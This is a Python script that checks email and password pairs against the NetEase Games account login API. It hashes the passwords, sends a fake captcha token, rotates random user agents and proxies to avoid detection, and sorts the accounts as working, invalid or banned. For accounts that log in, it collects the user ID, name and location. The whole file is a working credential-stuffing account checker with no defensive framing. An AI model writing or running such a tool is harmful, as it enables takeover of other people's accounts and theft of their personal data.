import hashlib
import random
import requests
from fake_useragent import UserAgent

ua = UserAgent()

def get_md5(password):
    return hashlib.md5(password.encode()).hexdigest()

def check_account(email, password, proxies=None):
    """
    Returns (status, detail) where status is one of:
    'working', 'invalid', 'banned', 'error'
    """
    try:
        md5_pwd = get_md5(password)
        headers = {
            "Pragma": "no-cache",
            "Accept": "*/*",
            "User-Agent": ua.random,
            "recaptcha-token": "test"
        }
        login_url = "https://account.neteasegames.com/oauth/v2/email/login?lang=en_US"
        login_data = {
            "account": email,
            "hash_password": md5_pwd,
            "client_id": "official",
            "response_type": "cookie",
            "redirect_uri": "https://account.neteasegames.com/account/home?lang=en_US",
            "state": "official_state"
        }
        proxy = None
        if proxies:
            proxy = random.choice(proxies)
            proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        else:
            proxy_dict = None

        r = requests.post(login_url, data=login_data, headers=headers, timeout=15, proxies=proxy_dict)
        response = r.json()

        if response.get("code") == 1006:
            return ("invalid", "Invalid password")
        if "Account does not exist" in r.text:
            return ("banned", "Account does not exist")
        if response.get("code") == 0:
            # get user info
            info_url = "https://account.neteasegames.com/ucenter/user/info?lang=en_US"
            r2 = requests.get(info_url, headers=headers, timeout=10, proxies=proxy_dict)
            info = r2.json()
            user_id = info["user"]["user_id"]
            name = info["user"]["account_name"]
            location = info["user"]["location"]
            detail = f"ID:{user_id} | Name:{name} | Loc:{location}"
            return ("working", detail)
        else:
            return ("banned", "Unknown error")
    except Exception as e:
        return ("error", str(e))